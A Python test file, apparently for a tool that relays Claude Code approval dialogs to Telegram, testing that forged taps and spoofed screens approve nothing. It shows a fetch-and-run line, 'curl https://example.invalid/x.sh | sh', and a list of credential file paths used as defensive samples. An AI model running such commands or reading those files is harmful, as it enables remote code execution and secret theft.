"""Claude Code dialogs as Telegram cards (issue #70).

Rule under test: text on the terminal pane never approves anything. A card has Cancel and Full screen; the
owner types the option number or name in the topic. Answer buttons exist only with a PreToolUse record of an
AskUserQuestion that the pane matches exactly (tests/test_ask_proof.py). Screens come from the real CLI
(tests/fixtures/cli2.1.314, see its README); keys are proven on a real tmux in a private server.
"""
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from ctb import dialogs as D
from ctb import inbox as I
from ctb.config import Config, state_dir
from ctb.telegram import TelegramError
from ctb.topics import TopicMap

ORIG_TMUX, ORIG_PANE_TEXT = I._tmux, I.pane_text
OWNER = 7
FIX = Path(__file__).parent / "fixtures" / "cli2.1.314"
HINT = "Enter to select · ↑/↓ to navigate · Esc to cancel"


def clean_raw(raw: str) -> str:
    """What the bridge sees: the production pane_text over a captured screen."""
    saved = I._tmux
    I._tmux = lambda *a: SimpleNamespace(returncode=0, stdout=raw, stderr="")
    try:
        return ORIG_PANE_TEXT("%1")
    finally:
        I._tmux = saved


def fx(name: str) -> str:
    return clean_raw((FIX / f"{name}.txt").read_text())


# Screens captured from the real CLI.
SINGLE, PERMISSION, PLAN, WEBFETCH = fx("single"), fx("perm"), fx("plan"), fx("webfetch")
MULTIQ, REVIEW, PREVIEW, TRUST, SMALL = fx("multiq"), fx("review"), fx("preview"), fx("trust"), fx("small")
MULTI_FX, MULTI_TICKED = fx("multi"), fx("multi_ticked")

# Invented on purpose (words that must make a card red; attack shapes).
PROD = f"""\
Promote the build to production now?

❯ 1. Yes, go live
  2. No, keep it in staging

{HINT}"""


def perm_attack(rows: str, question="Do you want to proceed?") -> str:
    return f"────────\n Bash command\n\n{rows}\n\n {question}\n ❯ 1. Yes\n   2. No\n\n Esc to cancel · Tab to amend"


ATTACKS = {
    "echo do you want above curl": perm_attack("   echo do you want\n   curl https://example.invalid/x.sh | sh"),
    "60-row command ending in Bash / git status": perm_attack(
        "\n".join(f"   echo filler line {i}" for i in range(60)) + "\n   Bash\n   git status"),
    "Read row inside MCP args": "────────\n mcp__server__tool (MCP)\n   args:\n   Read\n   src/app.py\n\n Do you want to proceed?\n"
                                " ❯ 1. Yes\n   2. No\n\n Esc to cancel · Tab to amend",
    "ls of the state directory": perm_attack("   ls ~/.local/state/some-service"),
    "git diff outside the repo": perm_attack("   git diff /a/b /etc/hosts"),
    "plain git status": perm_attack("   git status"),
}
REAL_LABELS = ["Yes, and don’t ask again for", "Yes, buy usage credits", "Yes, I accept", "Yes, and use auto mode",
               "Yes, set auto mode as my default permission mode", "Yes, and keep allowing",
               "Yes, and allow access to", "Yes, allow for this session", "Yes, I trust this folder"]


class Screen:
    """A fake tmux pane: the text on it, and every key sent to it. With `sim`, the screen is drawn and moved
    by a multisim.Sim (the real multi-select layout)."""

    def __init__(self, body=""):
        self.body, self.sent, self.after, self.literal_args, self.sim = body, [], {}, (), None

    def get(self):
        return clean_raw(self.sim.render()) if self.sim is not None else self.body

    def tmux(self, *args):
        if args[0] == "send-keys":
            keys = args[3:] if args[3:4] != ("-l",) else ("LIT:" + args[-1],)
            if args[3:4] == ("-l",):
                self.literal_args = args
            self.sent.extend(keys)
            for k in keys:
                if self.sim is not None:
                    self.sim.press(k)
                if k in self.after:
                    self.body = self.after[k]
        return SimpleNamespace(returncode=0, stdout="", stderr="")


@pytest.fixture
def rig(tmp_path, monkeypatch, bot):
    scr = Screen()
    monkeypatch.setattr(I, "_tmux", scr.tmux)
    monkeypatch.setattr(I, "pane_for_session", lambda s: "%1")
    monkeypatch.setattr(I, "pane_text", lambda pane, lines=45: scr.get())
    monkeypatch.setattr(D.time, "sleep", lambda s: None)
    monkeypatch.setattr(I.time, "sleep", lambda s: None)
    monkeypatch.setattr(I, "_terminal_background", lambda s, a: a() or True)
    monkeypatch.setattr(I, "react", lambda *a, **k: True)
    cfg = Config(bot_token="t", owner_chat_id=OWNER, ui_language="en")
    topics = TopicMap(state_dir() / "topics.json", bot, OWNER)
    thread = topics.ensure("s", "test")
    box = I.Inbox(tmp_path / "box")
    return SimpleNamespace(scr=scr, cfg=cfg, topics=topics, thread=thread, box=box, bot=bot)


def press(rig, data, user=OWNER, message_id=None, thread=None):
    if message_id is None:
        message_id = D.rec_get("s").get("message_id", 50)
    m = {"chat": {"id": OWNER, "type": "private"}, "message_thread_id": thread or rig.thread, "message_id": message_id}
    q = {"id": "q", "from": {"id": user}, "message": m, "data": data}
    return I.handle_button(q, rig.cfg, rig.bot, rig.topics, rig.box)


def say(rig, text, user=OWNER, thread=None, **extra):
    m = {"chat": {"id": OWNER, "type": "private"}, "from": {"id": user}, "message_thread_id": thread or rig.thread,
         "message_id": 60, "date": 2000000000, "text": text, **extra}
    media = SimpleNamespace(content_of=lambda mm: mm.get("text") or "")
    return I.handle({"message": m}, rig.cfg, rig.bot, rig.topics, rig.box, media, 0)


def last_card(rig):
    return [p for p in rig.bot.methods("sendMessage") if "reply_markup" in p][-1]


def buttons(card):
    return [b for row in card["reply_markup"]["inline_keyboard"] for b in row]


def kinds(card):
    return [b["callback_data"].split(":")[1] for b in buttons(card)]


def only_utility_buttons(card):
    return kinds(card) == ["e", "s"]


def forge_all(rig, stamp):
    """Every answer callback an attacker could invent for a card without proof: none may send a key."""
    for data in (f"dg:o:1:{stamp}", f"dg:o:2:{stamp}", f"dg:x:3:{stamp}", f"dg:t:1:{stamp}", f"dg:d:{stamp}",
                 f"dg:k:enter:{stamp}", f"dg:k:down:{stamp}", f"dg:k:up:{stamp}", "dg:o:1", "dg:y:1:" + stamp):
        press(rig, data)


# --- parsing the real screens -------------------------------------------------------------------------------

def test_real_single_question():
    d = D.parse(SINGLE)
    assert [o.num for o in d.options] == [1, 2, 3, 4]
    assert d.question.endswith("Which database should the notes feature use?")
    assert d.options[0].cursor and d.options[2].other and not d.multi and not d.perm and not d.sensitive


@pytest.mark.parametrize("name,screen", [("perm", PERMISSION), ("plan", PLAN), ("webfetch", WEBFETCH), ("small", SMALL)])
def test_real_permission_screens_are_permission_dialogs_and_typed_only(name, screen):
    d = D.parse(screen)
    assert d is not None and d.perm, name
    assert D.kind_of(d) in ("lasting", "perm", "plan", "cut", "sensitive")


def test_rm_warning_permission_screen_is_a_two_option_permission_dialog_with_the_agents_footer():
    screen = fx("perm_rm_warning")
    d = D.parse(screen)
    assert d is not None and d.perm and not d.cut
    assert [(o.num, o.label) for o in d.options] == [(1, "Yes"), (2, "No")]
    assert d.hint.endswith("ctrl+x ctrl+k twice to stop background agents") and D.bottom_hint(screen)
    assert D.kind_of(d) == "perm"


def test_buttonless_permission_card_says_exactly_what_to_type():
    d = D.parse(fx("perm_rm_warning"))
    en = D.card_text(d, fx("perm_rm_warning"), "en")
    assert "Type 1 for Yes or 2 for No" in en
    he = D.card_text(d, fx("perm_rm_warning"), "he")
    line = next(r for r in he.splitlines() if "1 / 2" in r)
    assert "כתוב" in line and not re.search(r"[A-Za-z]", line)


def test_cut_permission_card_never_asks_for_a_typed_answer():
    import dataclasses
    d = dataclasses.replace(D.parse(fx("perm_rm_warning")), cut=True)
    assert D.type_line(d, "en") == "" and D.type_line(d, "he") == ""


@pytest.mark.parametrize("screen", [REVIEW, WEBFETCH, PLAN])
def test_screens_without_a_hint_row_are_dialogs_when_nothing_follows_the_options(screen):
    assert D.hint_row_index(screen.splitlines()) is None
    assert D.parse(screen) is not None and I._dialog_open(screen)


def test_real_multi_select_has_an_unnumbered_submit_row_in_the_walk():
    d = D.parse(MULTI_FX)
    assert d.multi and [o.checked for o in d.options[:4]] == [False] * 4 and d.options[4].checked is None
    assert d.nav == [("o", 1), ("o", 2), ("o", 3), ("o", 4), ("s",), ("o", 5)] and d.cursor_at == 0
    t = D.parse(MULTI_TICKED)
    assert [o.checked for o in t.options[:4]] == [True, False, True, False] and t.cursor_at == 4  # on Submit
    assert not any(o.confirm for o in d.options)


def test_tab_row_screen_scans_only_its_own_region_for_sensitive_words():
    assert not D.parse(MULTI_FX).sensitive and not D.parse(MULTIQ).sensitive
    noisy = MULTI_FX.replace("❯ please go", "❯ please delete the token and reset the password")
    assert not D.parse(noisy).sensitive  # the transcript above the dialog does not count


def test_preview_hint_row_and_labels():
    d = D.parse(PREVIEW)
    assert d is not None and [o.label for o in d.options] == ["Compact", "Roomy"]
    assert D._REAL_HINT.match("Enter to select · ↑/↓ to navigate · n to add notes · Esc to cancel")
    assert D._REAL_HINT.match("Enter to select · Tab/Arrow keys to navigate · Esc to cancel")
    assert D._REAL_HINT.match("Enter to select · ↑/↓ to navigate · ctrl+g to edit in VS Code · Esc to cancel")


def test_next_js_is_an_option_not_a_confirm_row():
    d = D.parse(SINGLE.replace("Postgres", "Next.js"))
    assert not any(o.confirm for o in d.options)
    d = D.parse(MULTI_FX.replace("Mushrooms", "Next.js"))
    assert not any(o.confirm for o in d.options)


def test_not_a_dialog():
    assert D.parse("1. first thing\nsome prose\nand more prose") is None
    assert D.parse("") is None
    assert D.parse(f"Here are steps:\n  3. third\n  4. fourth\n\n{HINT}") is None  # numbering must start at 1


def test_numbered_prose_and_idle_prompts_are_not_dialogs(rig):
    prose = "Here is the plan:\n\n1. Add a table\n2. Add a view\n3. Write tests\n\nShall I start?\n\n────────\n❯"
    assert D.parse(prose) is None
    for tail in ("Press Enter to confirm the change.", "Enter to confirm the change.", "press esc to cancel if wrong"):
        assert D.parse(f"1. one\n2. two\n\n{tail}") is None
        assert D.parse(f"Pick\n❯ 1. one\n  2. two\n\n{tail}") is None
    idle = ("⏺ All done.\n\n────────\n❯ 1. please fix\n────────\n  ⏸ manual mode on · ? for shortcuts")
    assert D.parse(idle) is None and not I._dialog_open(idle)
    idle2 = "⏺ Options:\n  ❯ 1. first\n    2. second\nWhat now?\n\n────────\n❯ \n────────\n  ⏸ manual mode on"
    assert D.parse(idle2) is None
    rig.scr.body = idle
    assert not D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert not D.held_notice(rig.cfg, rig.bot, {"message_thread_id": rig.thread, "message_id": 1}, "s")


def test_a_quoted_dialog_with_text_below_is_not_a_dialog():
    quoted = f"The prompt looked like this:\n\n❯ 1. Yes\n  2. No\n\n{HINT}\n\nSo that is what you will see."
    assert D.parse(quoted) is None and not D.bottom_hint(quoted)
    with_input = f"Pick\n❯ 1. Yes\n  2. No\n\n{HINT}\n\n────────\n❯ \n────────"
    assert D.parse(with_input) is None
    unhinted = "Pick\n❯ 1. Yes\n  2. No\n\nSo that is what you will see."
    assert D.parse(unhinted) is None
    assert D.parse(f"Pick\n❯ 1. Yes\n  2. No\n\n{HINT}\n  ⏵⏵ accept edits on · 12% context")  # a status line is fine


@pytest.mark.parametrize("toggle", ["show", "hide"])
def test_remote_control_connection_is_not_a_question(rig, toggle):
    screen = ("·✔︎· Connected · Documents\n"
              "  Capacity: 0/32 · New sessions will be created in the current directory\n\n"
              "Continue coding in the Claude mobile app or https://claude.ai/code\n"
              f"space to {toggle} QR code")
    rig.scr.body = screen
    assert D.parse(screen) is None
    assert not D.bottom_hint(screen)
    assert not I._dialog_open(screen, "s")
    assert D.open_screen("s")[3] is False
    assert not D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert not rig.bot.methods("sendMessage")
    # A real approval below the connection status must still reach the owner.
    assert I._dialog_open(screen + "\n" + PERMISSION, "s")
    assert D.bottom_hint(screen.replace(f"space to {toggle} QR code", "Space to select"))


def test_hint_grammar():
    for ok in (HINT, "Esc to cancel · Tab to amend", "Space to select · Enter to confirm · Esc to cancel",
               "Enter to confirm · Esc to exit"):
        assert D._REAL_HINT.match(ok), ok
    for bad in ("Press Enter to continue", "Press Enter to confirm the change.", "You may press esc to cancel it",
                "Enter to confirm the change."):
        assert not D._REAL_HINT.match(bad), bad


def test_dialog_open_ignores_prose_that_mentions_esc_to_cancel():
    assert not I._dialog_open("You can press esc to cancel the run, or enter to confirm later.\n❯ ")
    assert I._dialog_open(f"Pick one\n❯ 1. A\n  2. B\n\n{HINT}")


def test_pane_text_keeps_solid_dashed_and_plain_rules_apart():
    assert fx("perm").count("╌╌╌╌╌╌╌╌") == 2 and "────────" in fx("perm")
    plain = clean_raw("a\n---------\nb\n________\n")
    assert "────────" not in plain and "╌╌╌╌╌╌╌╌" not in plain


# --- no answer button without proof ---------------------------------------------------------------------------

@pytest.mark.parametrize("body", [SINGLE, PERMISSION, PLAN, WEBFETCH, REVIEW, MULTIQ, MULTI_FX, PREVIEW, SMALL, PROD,
                                  *ATTACKS.values()])
def test_every_card_has_only_cancel_and_full_screen_and_forged_taps_send_nothing(rig, body):
    rig.scr.body = body
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    card = last_card(rig)
    assert only_utility_buttons(card)
    forge_all(rig, D.parse(body).stamp)
    assert rig.scr.sent == []


def test_button_styles_cancel_is_danger_and_full_screen_is_unstyled(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    cancel, full = buttons(last_card(rig))
    assert cancel.get("style") == "danger" and "style" not in full


def test_recommended_star_only_for_the_label_that_says_so(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    text = last_card(rig)["text"]
    assert "1 · SQLite (Recommended) ⭐" in text and "2 · Postgres ⭐" not in text
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert "⭐" not in last_card(rig)["text"]


@pytest.mark.parametrize("body,grade", [(SINGLE, "🟢"), (PERMISSION, "🟡"), (PLAN, "🟡"), (WEBFETCH, "🟡"), (PROD, "🔴"),
                                         (TRUST, "⚪"), (SMALL, "🟡"), (REVIEW, "🟢"),
                                         ("Pick a theme\n\n  Enter to select · Esc to cancel", "⚪")])
def test_every_card_carries_a_grade_line(rig, body, grade):
    rig.scr.body = body
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    lines = last_card(rig)["text"].splitlines()
    assert lines[2].startswith(grade), lines[:4]  # title, time, grade
    # an unread screen is shown open, in the terminal's own columns; a read one keeps its screen folded
    assert ("<pre>" if grade == "⚪" else "<blockquote expandable>") in last_card(rig)["text"]


def test_an_unread_screen_shows_its_waiting_part_openly_and_is_kept(rig):
    reply = "\n".join(f"old reply line {n}" for n in range(60))
    rig.scr.body = reply + "\n\nPick a theme\n  Dark\n  Light\n\n  Enter to select · Esc to cancel"
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    text = last_card(rig)["text"]
    shown = text.split("<pre>")[1].split("</pre>")[0]
    assert shown.rstrip().endswith("Enter to select · Esc to cancel") and "Pick a theme" in shown
    assert "old reply line 0" not in shown and "─" not in shown and len(shown.splitlines()) <= D.SHOWN_ROWS
    assert "<blockquote" not in text
    assert D.waiting_part("a\n\n" + "─" * 40 + " title ─\n❯ \n" + "─" * 40 + "\n  status") == "a\n  status"
    # review of PR #199: deeply indented rows and rows of plain hyphens are content, never a rule
    assert D.waiting_part("Pick:\n          staging\n" + "-" * 12 + " x") == "Pick:\n          staging\n" + "-" * 12 + " x"
    from ctb.config import state_dir
    kept = list((state_dir() / "unread-screens").glob("*.txt"))
    assert len(kept) == 1 and "Pick a theme" in kept[0].read_text()


def test_card_texts_in_hebrew_keep_english_on_its_own_lines_and_time_on_its_own_line(rig):
    rig.cfg.ui_language = "he"
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    text = last_card(rig)["text"]
    assert "שאלה ממתינה לך" in text and "כתוב כאן" in text
    lines = text.split("<blockquote")[0].splitlines()
    assert re.fullmatch(r"\d\d:\d\d:\d\d", lines[1])
    for line in lines:
        assert not (any("\u0590" <= c <= "\u05ff" for c in line) and re.search(r"[A-Za-z]{3,}", line)), line


# --- lasting grants and sensitive words ---------------------------------------------------------------------------

@pytest.mark.parametrize("label", REAL_LABELS)
def test_real_cli_labels_are_lasting_or_sensitive(rig, label):
    body = f"Allow it?\n❯ 1. {label}\n  2. No\n\n{HINT}"
    d = D.parse(body)
    assert d.options[0].typed_only and D.kind_of(d) in ("lasting", "sensitive")
    rig.scr.body = body
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert only_utility_buttons(last_card(rig)) and "lasting permission" in last_card(rig)["text"]


def test_wrapped_option_labels_are_joined_before_matching():
    body = f"Allow it?\n❯ 1. Yes, run it once\n  2. Yes, and\n     don’t ask again for this folder\n  3. No\n\n{HINT}"
    d = D.parse(body)
    assert not d.options[0].typed_only and d.options[1].typed_only


def test_question_text_is_checked_for_lasting_grants():
    assert D.parse(f"Always allow this tool from now on?\n❯ 1. Yes\n  2. No\n\n{HINT}").lasting


@pytest.mark.parametrize("path", ["~/.ssh/id_rsa", "app/.env", "app/.envrc", "~/.kube/config", "~/.npmrc", "auth.json",
                                   "~/.aws/credentials", "Library/Keychains/login.keychain-db"])
def test_secret_paths_make_the_card_red(path):
    body = f"────────\n Read file\n   {path}\n\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n\n Esc to cancel"
    assert D.parse(body).sensitive


# --- the real tmux ------------------------------------------------------------------------------------------------

KEYLOG = """\
import sys, termios, tty
screen, log = sys.argv[1], sys.argv[2]
sys.stdout.write(open(screen).read().replace("\\n", "\\r\\n") + "\\r\\n")
sys.stdout.flush()
fd = sys.stdin.fileno()
tty.setraw(fd)
while True:
    ch = sys.stdin.buffer.read(1)
    if not ch:
        break
    open(log, "a").write(repr(ch) + "\\n")
"""


class RealTmux:
    """A private tmux server (own socket, TMUX and TMUX_PANE unset, TMUX_TMPDIR an existing private dir)."""

    def __init__(self, root: Path):
        self.root, self.sock, self.count = root, str(root / "sock"), 0
        self.env = {k: v for k, v in os.environ.items() if k not in ("TMUX", "TMUX_PANE")}
        self.env["TMUX_TMPDIR"] = str(root)
        (root / "keylog.py").write_text(KEYLOG)

    def run(self, *args):
        return subprocess.run(["tmux", "-S", self.sock, *args], capture_output=True, text=True, env=self.env,
                              timeout=10, check=False)

    def start(self, body: str = "", command: str = ""):
        """A pane showing `body` and logging every key (or running `command`). (pane id, key log file)."""
        n, log = self.count, self.root / f"keys{self.count}.txt"
        self.count += 1
        screen = self.root / f"screen{n}.txt"
        screen.write_text(body)
        cmd = command.format(log=log) if command else f"{sys.executable} -I {self.root / 'keylog.py'} {screen} {log}"
        r = self.run("new-session", "-d", "-s", f"t{n}", "-x", "110", "-y", "90", cmd)
        assert r.returncode == 0, r.stderr
        for _ in range(60):
            if self.run("capture-pane", "-p", "-t", f"t{n}").stdout.strip():
                break
            time.sleep(0.1)
        pane = self.run("display", "-p", "-t", f"t{n}", "#{pane_id}").stdout.strip()
        return pane, log

    def close(self):
        self.run("kill-server")  # always with -S: it can only ever reach this private server


@pytest.fixture
def real_tmux(tmp_path, private_tmux):
    if not shutil.which("tmux"):
        pytest.skip("tmux not installed")
    root = Path(tempfile.mkdtemp(prefix="ct", dir="/tmp"))
    server = RealTmux(root)
    yield server
    server.close()
    shutil.rmtree(root, ignore_errors=True)


def use_real_pane(monkeypatch, server, pane):
    """The production tmux and pane readers, aimed at the private server."""
    monkeypatch.setattr(I, "_tmux", lambda *a: server.run(*a))
    monkeypatch.setattr(I, "pane_text", ORIG_PANE_TEXT)
    monkeypatch.setattr(I, "pane_for_session", lambda s: pane)


def keys_of(log: Path) -> list:
    time.sleep(0.4)
    return log.read_text().split() if log.exists() else []


def test_the_private_server_is_the_only_one_reached(real_tmux):
    pane, _ = real_tmux.start("hello")
    names = real_tmux.run("list-sessions", "-F", "#{session_name}").stdout.split()
    assert names == ["t0"] and real_tmux.sock.startswith("/tmp/ct")


@pytest.mark.parametrize("name", list(ATTACKS))
def test_replayed_attacks_send_no_key_on_a_real_tmux(rig, real_tmux, monkeypatch, name):
    pane, log = real_tmux.start(ATTACKS[name])
    use_real_pane(monkeypatch, real_tmux, pane)
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert only_utility_buttons(last_card(rig))
    forge_all(rig, D.parse(I.pane_text(pane)).stamp)
    assert keys_of(log) == []


@pytest.mark.parametrize("name", ["plan", "webfetch", "review", "trust", "perm", "small", "preview", "single", "multiq"])
def test_blocker1_no_key_button_on_any_screen_with_option_rows(rig, real_tmux, monkeypatch, name):
    """"Exit plan mode?" used to get arrows and Enter, and one tap on Enter chose "switch to default"."""
    raw = (FIX / f"{name}.txt").read_text()
    pane, log = real_tmux.start(raw)
    use_real_pane(monkeypatch, real_tmux, pane)
    body = I.pane_text(pane)
    assert D.has_option_rows(body) and not D.keys_ok(body)
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert not any(k == "k" for k in kinds(last_card(rig)))
    stamp = D.parse(body).stamp if D.parse(body) else D.stamp_of(body)
    forge_all(rig, stamp)
    assert keys_of(log) == []


def test_key_buttons_only_for_a_screen_with_no_option_rows_and_they_reach_the_pane(rig, real_tmux, monkeypatch):
    body = "Settings\n  Theme: dark\n  Language: English\n\nEsc to exit"
    pane, log = real_tmux.start(body)
    use_real_pane(monkeypatch, real_tmux, pane)
    assert not D.has_option_rows(body) and D.keys_ok(body)
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert kinds(last_card(rig)) == ["k", "k", "k", "e", "s"]
    enter = [b for b in buttons(last_card(rig)) if b["callback_data"].startswith("dg:k:enter:")][0]["callback_data"]
    press(rig, enter)
    assert keys_of(log) == ["b'\\r'"]


def test_the_owners_typed_number_does_reach_a_real_pane(rig, real_tmux, monkeypatch):
    pane, log = real_tmux.start(PROD)
    use_real_pane(monkeypatch, real_tmux, pane)
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "2") == "dialog-typed"
    assert keys_of(log) == ["b'2'"]


def test_cancel_reaches_a_real_pane_as_escape(rig, real_tmux, monkeypatch):
    pane, log = real_tmux.start(SINGLE)
    use_real_pane(monkeypatch, real_tmux, pane)
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    monkeypatch.setattr(I, "_interrupted_idle", lambda *a: None)
    press(rig, buttons(last_card(rig))[0]["callback_data"])
    assert keys_of(log) == ["b'\\x1b'"]


# --- blocker 2: a stale card must not approve a different command -------------------------------------------------

def test_blocker2_a_long_command_whose_header_scrolled_off_is_refused_with_a_message(rig, real_tmux, monkeypatch):
    pane, log = real_tmux.start((FIX / "small.txt").read_text())
    use_real_pane(monkeypatch, real_tmux, pane)
    d = D.parse(I.pane_text(pane))
    assert d.perm and d.cut
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert "cut off" in last_card(rig)["text"] or "top not visible" in last_card(rig)["text"]
    assert say(rig, "1") == "dialog-cut"
    assert "cut off" in rig.bot.methods("sendMessage")[-1]["text"] and "Full screen" in rig.bot.methods("sendMessage")[-1]["text"]
    assert keys_of(log) == []


def test_blocker2_the_same_options_under_another_command_are_another_dialog(rig):
    a, b = PERMISSION, PERMISSION.replace("touch lab-file.txt", "touch other-file.txt")
    da, db = D.parse(a), D.parse(b)
    assert not da.cut and not db.cut
    assert da.stamp != db.stamp and da.identity != db.identity
    rig.scr.body = a
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.body = b  # approved in the terminal, then another command with the same options appeared
    assert say(rig, "1") == "dialog-stale" and rig.scr.sent == []
    press(rig, buttons(last_card(rig))[0]["callback_data"])  # an old Cancel does not touch the new one
    assert rig.scr.sent == []


def test_blocker2_the_watcher_shows_the_new_command(rig):
    from ctb import topics as T
    T.session_state_path("s").parent.mkdir(parents=True, exist_ok=True)
    T.session_state_path("s").write_text(json.dumps({"state": "busy"}))
    D._first_seen.clear()
    rig.scr.body = PERMISSION
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    n = len(rig.bot.methods("sendMessage"))
    rig.scr.body = PERMISSION.replace("touch lab-file.txt", "touch other-file.txt")
    assert D.remind(rig.cfg, rig.bot, rig.topics, now=1000.0) == 0
    assert D.remind(rig.cfg, rig.bot, rig.topics, now=1030.0) == 1
    assert len(rig.bot.methods("sendMessage")) == n + 1 and "other-file" in last_card(rig)["text"]


def test_blocker2_a_complete_permission_prompt_can_be_answered_by_typing(rig, real_tmux, monkeypatch):
    pane, log = real_tmux.start((FIX / "perm.txt").read_text())
    use_real_pane(monkeypatch, real_tmux, pane)
    assert not D.parse(I.pane_text(pane)).cut
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "1") == "dialog-typed"
    assert keys_of(log) == ["b'1'"]


# --- blocker 3: multi-select with the unnumbered Submit row ---------------------------------------------------------

SIM = f"{sys.executable} -I {Path(__file__).parent / 'multisim.py'} {{log}}"


def start_sim(real_tmux, ticks="0000"):
    return real_tmux.start(command=SIM + " " + ticks)


def sim_result(log: Path, wait=3.0):
    end = time.time() + wait
    while time.time() < end:
        if log.exists() and log.read_text().strip():
            return json.loads(log.read_text())
        time.sleep(0.1)
    return None


def test_blocker3_typed_numbers_tick_exactly_those_and_submit_on_a_real_pane(rig, real_tmux, monkeypatch):
    pane, log = start_sim(real_tmux)
    use_real_pane(monkeypatch, real_tmux, pane)
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "1, 3") == "dialog-typed"
    assert sim_result(log) == ["Cheese", "Mushrooms"]
    assert "1. Cheese" in rig.bot.methods("editMessageText")[-1]["text"]


def test_blocker3_a_preticked_option_the_owner_did_not_name_is_unticked(rig, real_tmux, monkeypatch):
    pane, log = start_sim(real_tmux, "0100")  # Olives pre-ticked
    use_real_pane(monkeypatch, real_tmux, pane)
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "1, 3") == "dialog-typed"
    assert sim_result(log) == ["Cheese", "Mushrooms"]


def test_blocker3_enter_is_never_pressed_off_the_submit_row(rig):
    from multisim import Sim
    sim = Sim()
    rig.scr.sim = sim
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    say(rig, "2")
    assert sim.done == ["Olives"] and rig.scr.sent.count("Enter") == 1 and rig.scr.sent[-1] == "Enter"
    assert sim.ticks[1] is True  # the Enter went to Submit, it did not toggle a row


def test_blocker3_a_mismatching_screen_stops_the_sequence(rig):
    from multisim import Sim

    class Stuck(Sim):
        def press(self, key):  # the cursor never moves: every verification fails
            if key in ("Down", "Up"):
                return
            super().press(key)
    sim = Stuck()
    rig.scr.sim = sim
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    say(rig, "3")
    assert "Enter" not in rig.scr.sent and "Space" not in rig.scr.sent and sim.done is None
    assert "Could not send" in rig.bot.methods("sendMessage")[-1]["text"]


def test_blocker3_the_typed_other_row_and_unknown_numbers_are_not_answers(rig):
    from multisim import Sim
    rig.scr.sim = Sim()
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "4") == "queued" and say(rig, "9") == "queued"
    assert rig.scr.sent == []


# --- blocker 4 and 5: dialogs with no hint row ---------------------------------------------------------------------

def test_blocker4_the_review_screen_gets_a_card_and_is_answered_by_typing(rig, real_tmux, monkeypatch):
    pane, log = real_tmux.start((FIX / "review.txt").read_text())
    use_real_pane(monkeypatch, real_tmux, pane)
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread) and only_utility_buttons(last_card(rig))
    assert "Submit answers" in last_card(rig)["text"]
    assert say(rig, "1") == "dialog-typed"
    assert keys_of(log) == ["b'1'"]


def test_blocker4_the_watcher_sees_a_screen_with_no_hint_row(rig):
    from ctb import topics as T
    T.session_state_path("s").parent.mkdir(parents=True, exist_ok=True)
    T.session_state_path("s").write_text(json.dumps({"state": "busy"}))
    D._first_seen.clear()
    rig.scr.body = REVIEW
    assert D.remind(rig.cfg, rig.bot, rig.topics, now=1000.0) == 0
    assert D.remind(rig.cfg, rig.bot, rig.topics, now=1030.0) == 1
    assert D.rec_get("s")["typed"]


def test_blocker4_a_multi_question_form_walks_to_the_review_card(rig):
    rig.scr.body = MULTIQ
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.after["1"] = REVIEW
    assert say(rig, "1") == "dialog-typed"
    assert "Submit answers" in last_card(rig)["text"]  # the next card is the review


def test_blocker4_an_ordinary_reply_is_still_not_a_dialog(rig):
    rig.scr.body = "I can do two things:\n\n  ❯ 1. fix it\n    2. leave it\n\nWhich do you prefer?\n"
    assert not D.send_card(rig.cfg, rig.bot, "s", rig.thread)


def test_blocker5_webfetch_stays_answerable_and_the_watcher_keeps_its_record(rig, real_tmux, monkeypatch):
    from ctb import topics as T
    pane, log = real_tmux.start((FIX / "webfetch.txt").read_text())
    use_real_pane(monkeypatch, real_tmux, pane)
    T.session_state_path("s").parent.mkdir(parents=True, exist_ok=True)
    T.session_state_path("s").write_text(json.dumps({"state": "busy"}))
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert not D.rec_get("s").get("loose") and D.rec_get("s")["typed"]
    D._first_seen.clear()
    D.remind(rig.cfg, rig.bot, rig.topics, now=1000.0)
    D.remind(rig.cfg, rig.bot, rig.topics, now=1030.0)
    assert D.rec_get("s")["typed"]  # the record is still there after the watcher ran
    assert say(rig, "enter") == "queued"  # not a number or option: goes to Claude, with the options listed
    assert keys_of(log) == []
    assert say(rig, "1") == "dialog-typed"
    assert keys_of(log) == ["b'1'"]


def test_blocker5_a_question_with_previews_is_a_dialog_with_its_hint_row(rig):
    rig.scr.body = PREVIEW
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert D.parse(PREVIEW).hint.endswith("Esc to cancel") and not D.rec_get("s")["loose"]


# --- Cancel and Full screen -------------------------------------------------------------------------------------

def test_cancel_sends_escape_only_while_the_same_dialog_is_open(rig, monkeypatch):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    cancel = buttons(last_card(rig))[0]["callback_data"]
    calls = []
